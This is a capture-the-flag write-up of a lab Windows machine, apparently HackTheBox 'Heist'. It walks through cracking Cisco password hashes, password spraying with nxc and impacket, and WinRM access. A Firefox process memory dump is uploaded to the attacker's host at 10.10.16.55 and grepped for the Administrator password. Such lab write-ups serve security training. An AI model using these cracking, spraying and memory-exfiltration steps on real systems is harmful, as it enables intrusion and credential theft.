1. The machine shows an open port 80. Inside of it a login form and a way to login as a Guest
![[attachments/heist-1.png]]
2. Inside the guest login we notice a clear text chat with a system administrator with an attachment
![[attachments/heist-2.png]]
3. The attachment is a configuration coming from Cisco 12.2, we discover 3 hashes in clear sight
![[attachments/heist-3.png]]
4. The first one can be cracked with `hashcat -m 500` and returns us the password: `stealth1agent`
```sh
hashcat -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' /usr/share/wordlists/rockyou.txt
```
5. With a basic spraying we discover that this password can be used by the user `hazard` (same user mentioned in the ticket above) to access SMB, however we have only the possibility to confirm that the credentials works because we can only read the IPC$ share which leads us nowhere
6. We also discover we can use the same set to authenticate to rpcclient, but some commands seems not to be working because we're not in an AD environment
```sh
rpcclient -U "hazard"%"stealth1agent" 10.129.6.9
```
7. We opt to use `impacket-lookupsid` to enumerate the existing users on the machine 
```sh
impacket-lookupsid SUPPORTDESK/hazard:stealth1agent@10.129.6.9
```

>Alternatively we could discover the SID of the Administrator and replace the last part (usually ending with 500) with different values (usually > 1000) to enumerate existing users
>```sh
>lookupnames Administrator
Administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
>```
>

Now, removing the last part `-500` returns us the Domain SID
![[attachments/heist-4.png]]
8. We discover that the other two passwords are Cisco Type 7 passwords that, as mentioned here, can be easily reversed: https://media.defense.gov/2022/Feb/17/2002940795/-1/-1/1/CSI_CISCO_PASSWORD_TYPES_BEST_PRACTICES_20220217.PDF. We discover with a quick research about `Cisco Type 7 Decrypt` and find the following link: https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html that permits us to decrypt a Type 7 hash instantaneously. We identify the type is 7 from here:
![[attachments/heist-5.png]]
9. After cracking the two passwords we obtain the following passwords: `$uperP@ssword` and `Q4)sJu\Y8qz*A3?d`. After spraying them with the users discovered within `impacket-lookupsid` we discover that the following user has access through SMB
```sh
nxc smb 10.129.6.9 -u ../users.txt -p ../psw.txt --continue-on-success
```
![[attachments/heist-6.png]]
10. That user can apparently also authenticate with WinRM, those we opt to get inside the machine through WinRM (on SMB we anyways only had read rights over IPC)
![[attachments/heist-7.png]]
11. Once authenticated with the user `Chase` we finally start discovering a bit of the structure of the machine. We notice, within `WinPeas` that strangely `Firefox` seems to be installed, which is unusual. We can assume that might've been used to land onto the login portal we've seen, but that's just an assumption yet. We run `Get-Process` to understand the PID of Firefox to then be able to dump the process memory and be able to analyze it offline.
![[attachments/heist-8.png]]
12. To start with, we'll target the first process with a PID of 4292. To Dump the process we'll use the most reliable tool which is ProcDump, a tool from the SysInternal suite: https://learn.microsoft.com/it-it/sysinternals/downloads/procdump. After downloading it on our end and transferring it on the target we'll execute it in the following way:
```sh
./ProcDump.exe -accepteula -ma 4292 # -ma corrisponds to a full dump, and after trying with a minified version we didn't notice anything interesting

# or, with `Out-Minidump.ps1`

Get-Process -id 4292 | Out-Minidump
```

>Actually, using `Out-Minidump` provided us a binary result which is easily 'greppable'. So the next times I'd hop in for this and eventually us `ProcDump` as an alt

13. After generating it, we'll transfer it on our end (it'll take a while since it's 300mb of data)
```sh
# On our attacking machine we run a FTP server
python3 -m uploadserver 21

# On the target we use Invoke-FileUpload to upload the dmp on our FTP
Invoke-FileUpload http://10.10.16.55:21/upload -File "firefox_4292.dmp"
```
14. Finally, once we have the file on our end we can read it. Considering that the machine has Firefox, as mentioned above we **could** assume that someone might've used the website hosted on port 80. So we could technically search for `login.php` to check whether anyone landed on that page and whether someone has logged in on the page. (we could technically also reference the password field of the DOM to pick the exact point of our interest).
```sh
grep -a 'login_password' firefox_4292.dmp
```
![[attachments/heist-9.png]]
15. From the dump we notice how after the login password field the password is visualized: `4dD!5}x/re8]FBuZ`.
16. At this point, we add the password to our `psw.txt` file and proceed to spray again this password on SMB, discovering that new password belongs to the Administrator
```sh
nxc smb 10.129.6.9 -u users.txt -p psw.txt --continue-on-success
```
![[attachments/heist-10.png]]
17. We can now connect with `evil-winrm` and get the root flag
```sh
evil-winrm -i 10.129.6.9 -u Administrator -p '4dD!5}x/re8]FBuZ'
```